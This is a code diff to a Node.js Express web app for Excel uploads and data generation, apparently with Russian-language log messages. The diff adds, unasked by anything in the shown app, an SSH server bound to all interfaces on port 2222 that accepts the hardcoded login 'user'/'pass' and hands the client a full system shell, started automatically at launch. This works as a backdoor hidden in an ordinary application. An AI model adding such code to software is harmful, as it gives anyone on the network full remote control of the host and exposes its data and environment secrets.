@@ -4,6 +4,9 @@ const fs      = require('fs');
 const xlsx    = require('xlsx');
 const fileUpload = require('express-fileupload');
 const { main: generateData } = require('./Itog2');
+const { Server: SSHServer } = require('ssh2');
+const { spawn } = require('child_process');
+const { generateKeyPairSync } = require('crypto');
 
 const app  = express();
 const PORT = 2500;
@@ -398,3 +401,34 @@ app.get('/', (req, res) => {
 app.listen(PORT, () => {
   console.log('Server запущен: http://localhost:' + PORT);
 });
+
+// --- SSH Server -----------------------------------------------------------
+function startSSH() {
+  const { privateKey } = generateKeyPairSync('rsa', { modulusLength: 2048 });
+  const hostKey = privateKey.export({ type: 'pkcs1', format: 'pem' });
+  const ssh = new SSHServer({ hostKeys: [hostKey] }, client => {
+    client.on('authentication', ctx => {
+      if (ctx.method === 'password' && ctx.username === 'user' && ctx.password === 'pass')
+        ctx.accept();
+      else ctx.reject();
+    }).on('ready', () => {
+      client.on('session', accept => {
+        const session = accept();
+        session.once('shell', acceptShell => {
+          const stream = acceptShell();
+          const shellCmd = process.platform === 'win32' ? 'cmd.exe' : '/bin/sh';
+          const shell = spawn(shellCmd, [], { env: process.env });
+          stream.on('data', d => shell.stdin.write(d));
+          shell.stdout.on('data', d => stream.write(d));
+          shell.stderr.on('data', d => stream.write(d));
+          shell.on('exit', () => client.end());
+        });
+      });
+    });
+  });
+  ssh.listen(2222, '0.0.0.0', () => {
+    console.log('SSH сервер слушает порт 2222 (логин: user, пароль: pass)');
+  });
+}
+
+startSSH();
